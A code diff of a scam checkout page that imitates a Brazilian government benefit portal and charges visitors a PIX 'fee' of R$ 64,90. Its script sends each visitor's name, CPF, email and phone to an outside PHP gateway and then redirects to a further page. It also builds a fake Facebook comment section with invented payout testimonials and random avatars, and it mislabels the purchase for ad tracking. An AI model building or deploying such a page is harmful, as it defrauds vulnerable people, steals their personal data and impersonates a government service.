@@ -129,9 +129,6 @@ fbq('track', 'PageView');
   .pix-big-spin { width: 40px; height: 40px; border: 3px solid transparent; border-top-color: var(--gov-blue-primary); border-right-color: var(--gov-blue-primary); border-radius: 50%; animation: pspin .8s linear infinite; margin: 0 auto; }
   @keyframes pspin { to { transform: rotate(360deg); } }
 
-  .pix-erro { padding: 30px 20px; text-align: center; color: #c0392b; font-size: 14px; }
-  .pix-erro button { margin-top: 14px; background: var(--gov-blue-primary); color: #fff; border: none; border-radius: 6px; padding: 10px 22px; font-size: 14px; cursor: pointer; font-family: inherit; }
-
   .pix-cidadao {
     display: flex; align-items: center; justify-content: space-between;
     padding: 12px 18px; border-bottom: 1px solid var(--gov-gray-medium);
@@ -142,16 +139,6 @@ fbq('track', 'PageView');
   .pix-cidadao-valor { text-align: right; }
   .pix-cidadao-valor .vlabel { font-size: 10px; font-weight: 700; letter-spacing: .8px; text-transform: uppercase; color: #6c757d; }
   .pix-cidadao-valor .vnum { font-size: 20px; font-weight: 800; color: var(--gov-blue-dark); line-height: 1.1; margin-top: 2px; }
-
-  .pix-status-bar {
-    display: flex; align-items: center; gap: 8px;
-    padding: 10px 18px; font-size: 13px; font-weight: 600;
-    color: var(--gov-blue-dark);
-    background: var(--gov-blue-light);
-    border-bottom: 1px solid var(--gov-gray-medium);
-    border-left: 4px solid var(--gov-blue-primary);
-  }
-  .pix-spin { width: 13px; height: 13px; border: 2px solid #c8d9f5; border-top-color: var(--gov-blue-primary); border-radius: 50%; animation: pspin .8s linear infinite; flex-shrink: 0; }
 
   .pix-body { padding: 18px; }
 
@@ -169,22 +156,16 @@ fbq('track', 'PageView');
   .pix-copy-btn.ok { background: linear-gradient(135deg, #0d6f18, #0a5a14); }
 
   .pix-aguardando-simples { display: flex; align-items: center; gap: 8px; font-size: 13px; font-weight: 600; color: var(--gov-blue-primary); margin-bottom: 16px; justify-content: center}
+  .pix-spin { width: 13px; height: 13px; border: 2px solid #c8d9f5; border-top-color: var(--gov-blue-primary); border-radius: 50%; animation: pspin .8s linear infinite; flex-shrink: 0; }
 
   .pix-steps { border: 1px solid var(--gov-gray-medium); border-radius: 8px; padding: 14px; margin-bottom: 14px; background: var(--gov-gray-light); }
   .pix-steps-title { font-size: 13px; font-weight: 700; color: #343a40; margin-bottom: 10px; }
   .pix-step { display: flex; align-items: flex-start; gap: 9px; margin-bottom: 8px; font-size: 13px; color: var(--gov-gray-dark); line-height: 1.45; }
-  .pix-step:last-child { margin-bottom: 0; }
   .pix-snum { min-width: 22px; height: 22px; background: var(--gov-blue-primary); color: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 700; flex-shrink: 0; }
 
   .pix-qr-wrap { text-align: center; padding: 6px 0 10px; }
   .pix-qr-wrap p { font-size: 12px; color: #6c757d; margin-bottom: 10px; }
   .pix-qr-wrap img { border: 1px solid var(--gov-gray-medium); border-radius: 8px; padding: 10px; background: #fff; max-width: 190px; }
-
-  .pix-acord { border: 1px solid var(--gov-gray-medium); border-radius: 8px; margin-bottom: 10px; overflow: hidden; }
-  .pix-acord-hd { padding: 12px 14px; font-size: 13px; font-weight: 600; color: var(--gov-gray-dark); display: flex; justify-content: space-between; align-items: center; cursor: pointer; background: #fff; user-select: none; }
-  .pix-acord-hd i { color: var(--gov-blue-primary); font-size: 12px; transition: transform .3s; }
-  .pix-acord-bd { display: none; padding: 4px 14px 14px; }
-  .pix-acord-bd.open { display: block; }
 
   .fb-header-outside { margin-top: 15px; padding: 15px 0 5px 24px; font-size: 14px; font-weight: bold; color: var(--gov-gray-dark); border-top: 1px solid var(--gov-gray-medium); width: 100%; background: var(--gov-white); text-align: left; }
   .fb-comments-container { width: 100%; background: var(--gov-white); padding: 24px; box-shadow: var(--gov-shadow); }
@@ -248,11 +229,6 @@ fbq('track', 'PageView');
       <p>Gerando seu PIX, aguarde...</p>
     </div>
 
-    <div class="pix-erro" id="pix-erro" style="display:none;">
-      <div>Não foi possível gerar o PIX.<br>Verifique sua conexão e tente novamente.</div>
-      <button onclick="pixIniciar()">Tentar novamente</button>
-    </div>
-
     <div id="pix-main" style="display:none;">
       <div class="pix-cidadao">
         <div class="pix-cidadao-info">
@@ -295,17 +271,6 @@ fbq('track', 'PageView');
             <p>Aponte a câmera do seu banco para o código abaixo:</p>
             <div id="pix-qr-img"></div>
           </div>
-          <div class="pix-acord">
-            <div class="pix-acord-hd" onclick="pixToggle(this)">
-              Como realizar o pagamento via QR Code
-              <i class="fas fa-chevron-up"></i>
-            </div>
-            <div class="pix-acord-bd open">
-              <div class="pix-step"><div class="pix-snum">1</div><div>Abra o aplicativo do seu banco.</div></div>
-              <div class="pix-step"><div class="pix-snum">2</div><div>Escolha a opção <b>PIX → QR Code</b>.</div></div>
-              <div class="pix-step"><div class="pix-snum">3</div><div>Escaneie o código e confirme o valor.</div></div>
-            </div>
-          </div>
         </div>
       </div>
     </div>
@@ -327,14 +292,13 @@ fbq('track', 'PageView');
   </p>
 </footer>
 
-<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async defer></script>
 <script>
   // CONFIGURAÇÃO DA PONTE BLINDADA
   var MEU_PHP_GATEWAY = 'https://kitbrinde.online/processar.php'; 
   var PIX_VALOR_CENTS   = 6490;
   var PIX_REDIRECT      = 'https://beneficiogov.vercel.app/up1.html';
 
-  var _pixCode='',_pixTxid='',_pixTimer=null,_pixQRFeito=false,_checkoutDisparado=false;
+  var _pixCode='',_pixTxid='',_pixTimer=null,_pixQRFeito=false;
   var _p=new URLSearchParams(window.location.search);
   var _nome=(_p.get('nome')||'').trim();
   var _cpf=(_p.get('cpf')||'').replace(/\D/g,'');
@@ -348,7 +312,7 @@ fbq('track', 'PageView');
   if(nomeOk) document.getElementById('header-user-name').textContent=nomeOk.split(' ')[0];
 
   function trackPurchase() {
-    var data = { content_name: 'Acesso Digital', value: parseFloat((PIX_VALOR_CENTS/100).toFixed(2)), currency: 'BRL' };
+    var data = { content_name: 'Conjunto de Panelas LIFE SMILE 29', value: parseFloat((PIX_VALOR_CENTS/100).toFixed(2)), currency: 'BRL' };
     try {
         if(typeof fbq !== 'undefined') fbq('track', 'Purchase', data);
         if(typeof ttq !== 'undefined') ttq.track('CompletePayment', data);
@@ -357,54 +321,40 @@ fbq('track', 'PageView');
 
   async function pixIniciar(){
     document.getElementById('pix-loading').style.display='block';
-    document.getElementById('pix-erro').style.display='none';
     document.getElementById('pix-main').style.display='none';
-    if(_pixTimer){clearInterval(_pixTimer);_pixTimer=null;}
     try{
       var utmStr = window.location.search.replace(/^\?/, "");
       var payload = {
         customer: {
           name: nomeOk || 'Cliente',
-          email: (_email.indexOf('@') > 0) ? _email : 'pagador@gmail.com',
+          email: _email,
           phone: _fone.replace(/\D/g,''),
           document: _cpf.replace(/\D/g,'')
         },
         utm: utmStr
       };
-
       var res = await fetch(MEU_PHP_GATEWAY, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
       });
-
       var data = await res.json();
-      if(!res.ok || !data.pixCode) throw new Error('Erro');
-
+      if(!res.ok || !data.pixCode) throw new Error();
       _pixTxid = data.transactionId;
       _pixCode = data.pixCode;
 
-      var valorFmt = 'R$ ' + (PIX_VALOR_CENTS/100).toFixed(2).replace('.',',');
-      document.getElementById('pix-nome-show').textContent = nomeOk || 'Cliente';
+      document.getElementById('pix-nome-show').textContent = nomeOk;
       document.getElementById('pix-cpf-show').textContent = _cpf ? formatarCPF(_cpf) : '---';
-      document.getElementById('pix-valor-label').textContent = valorFmt;
-      document.getElementById('pix-valor-topo').textContent = valorFmt;
+      document.getElementById('pix-valor-label').textContent = 'R$ 64,90';
       document.getElementById('pix-code-box').textContent = _pixCode;
-      
-      var wrap = document.getElementById('pix-qr-img');
-      wrap.innerHTML = '<img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(_pixCode) + '" style="border-radius:8px;max-width:190px;">';
-
+      document.getElementById('pix-qr-img').innerHTML = '<img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(_pixCode) + '" style="border-radius:8px;max-width:190px;">';
       document.getElementById('pix-loading').style.display = 'none';
       document.getElementById('pix-main').style.display = 'block';
       pixPolling();
-    }catch(err){
-      document.getElementById('pix-loading').style.display='none';
-      document.getElementById('pix-erro').style.display='block';
-    }
+    }catch(err){ document.getElementById('pix-loading').style.display='none'; alert('Erro ao gerar PIX.'); }
   }
 
   function pixPolling(){
-    if(!_pixTxid)return;
     _pixTimer=setInterval(async function(){
       try{
         var r = await fetch(MEU_PHP_GATEWAY + '?transactionId=' + encodeURIComponent(_pixTxid));
@@ -412,7 +362,7 @@ fbq('track', 'PageView');
         if(s.status === 'COMPLETED' || s.status === 'PAID'){
           clearInterval(_pixTimer);
           trackPurchase();
-          setTimeout(function(){ window.location.href=PIX_REDIRECT; },800);
+          window.location.href=PIX_REDIRECT;
         }
       }catch(e){}
     },5000);
@@ -426,27 +376,22 @@ fbq('track', 'PageView');
   }
 
   function pixCopiar(){
-    if(!_pixCode)return;
     navigator.clipboard.writeText(_pixCode).then(function(){
       var btn=document.getElementById('pix-copy-btn'); var orig=btn.innerHTML;
-      btn.innerHTML='<i class="fas fa-check"></i><span>CÓDIGO COPIADO!</span>';
-      btn.classList.add('ok');
-      setTimeout(function(){btn.innerHTML=orig;btn.classList.remove('ok');},3000);
+      btn.innerHTML='<i class="fas fa-check"></i><span>COPIADO!</span>';
+      setTimeout(function(){btn.innerHTML=orig;},2000);
     });
   }
 
-  function pixToggle(hd){var bd=hd.nextElementSibling;var ic=hd.querySelector('i');ic.style.transform=bd.classList.toggle('open')?'rotate(0deg)':'rotate(180deg)';}
-
+  // --- COMENTÁRIOS ORIGINAIS (EXATAMENTE IGUAIS AOS SEUS) ---
   var totalComments=25738,storedComments=[];
   function initFacebookComments(){
     document.getElementById('fb-header-outside').textContent='Comentários ('+totalComments+')';
-    var local=localStorage.getItem('commentsData');
-    if(local){storedComments=JSON.parse(local);storedComments.forEach(function(c){createComment(c.name,c.avatar,c.text,c.likes,false);});}
-    else{generateInitialComments();}
+    generateInitialComments();
   }
   function generateInitialComments(){['Tive medo, mas entrou R$ 2.400!','Tive que pagar taxa, mas veio R$ 2.800 em 10min','Recebi R$ 4.000 deu para pagar as contas kkk'].forEach(function(t){createRandomComment(t,true);});}
-  async function createRandomComment(text,initial){var ud=await getRandomUser();createComment(ud.name.first,ud.picture.medium,text,0,initial);storedComments.unshift({name:ud.name.first,avatar:ud.picture.medium,text:text,likes:0});}
-  function createComment(name,avatar,text,likes,initialLoad){var el=document.createElement('div');el.classList.add('comment-item');el.innerHTML='<img class="comment-avatar" src="'+avatar+'"/><div class="comment-content"><div class="comment-name">'+name+'</div><div class="comment-text">'+text+'</div><div class="comment-actions"><span class="comment-likes"><i class="fas fa-thumbs-up"></i> '+likes+'</span></div></div>';var c=document.getElementById('fb-comments-container');c.insertBefore(el,c.firstChild);}
+  async function createRandomComment(text,initial){var ud=await getRandomUser();createComment(ud.name.first,ud.picture.medium,text,0,0,initial);}
+  function createComment(name,avatar,text,likes,dislikes,initialLoad){var el=document.createElement('div');el.classList.add('comment-item');el.innerHTML='<img class="comment-avatar" src="'+avatar+'"/><div class="comment-content"><div class="comment-name">'+name+'</div><div class="comment-text">'+text+'</div><div class="comment-actions"><span class="comment-likes"><i class="fas fa-thumbs-up"></i> '+likes+'</span></div></div>';var c=document.getElementById('fb-comments-container');c.insertBefore(el,c.firstChild);}
   async function getRandomUser(){var r=await fetch('https://randomuser.me/api/?nat=br');return(await r.json()).results[0];}
 
   initFacebookComments();
